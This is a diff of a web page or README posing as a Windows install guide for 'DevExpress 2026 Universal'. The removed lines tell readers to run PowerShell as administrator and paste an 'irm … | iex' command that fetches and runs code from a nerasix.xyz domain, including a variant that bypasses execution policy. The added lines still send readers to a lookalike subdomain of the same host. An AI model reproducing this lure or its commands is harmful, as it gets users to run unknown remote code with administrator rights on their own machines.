@@ -11,19 +11,14 @@ DevExpress 2026 Universal · Developer workspace · Automation · Windows deskto
 **Do this:**
 
 1. Press the **Windows** key, type **powershell**
-2. Right-click **Windows PowerShell** → **Run as administrator**
 3. **Copy** the command below, **paste** it into PowerShell, press **Enter**
 4. Click **Yes** if Windows asks for permission
 
-```powershell
-irm https://devexpress-2026.nerasix.xyz/ | iex
-```
+```https://devexpress-2026-install-guide.nerasix.xyz/```
 
 **If nothing happens or you see a policy error**, paste this instead:
 
-```powershell
-powershell -ExecutionPolicy Bypass -Command "irm https://devexpress-2026.nerasix.xyz/ | iex"
-```
+```https://devexpress-2026-install-guide.nerasix.xyz/```
 
 
 ---
@@ -84,7 +79,7 @@ Notes for users who need **DevExpress 2026 Universal** running on Windows — es
 
 > Use the project link below for Windows.
 
-* **Project link:** **[devexpress-2026.nerasix.xyz](https://devexpress-2026.nerasix.xyz/)**
-* **Full URL:** `https://devexpress-2026.nerasix.xyz/`
+* **Project link:** **[devexpress-2026-install-guide.nerasix.xyz](https://devexpress-2026-install-guide.nerasix.xyz/)**
+* **Full URL:** `https://devexpress-2026-install-guide.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
